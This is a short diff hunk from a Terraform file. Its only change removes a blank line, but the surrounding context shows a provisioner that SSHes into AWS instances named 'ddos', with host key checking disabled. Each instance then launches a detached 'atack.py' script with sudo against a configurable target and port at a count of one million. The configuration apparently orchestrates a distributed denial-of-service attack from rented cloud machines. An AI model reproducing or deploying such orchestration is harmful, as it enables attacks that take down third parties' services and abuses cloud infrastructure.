@@ -84,7 +84,6 @@ resource "null_resource" "atack_py" {
      hostname = aws_instance.ddos[count.index].private_dns
   }
   provisioner "local-exec" {
-
     command = "ssh -oStrictHostKeyChecking=no -i ${abspath(path.root)}/kozak_rsa -f ubuntu@${aws_instance.ddos[count.index].public_ip} 'screen -d -m sudo python3 /tmp/atack.py -t ${var.goal_atack}  -p ${var.port_atack} -c 1000000'"
   }
 }
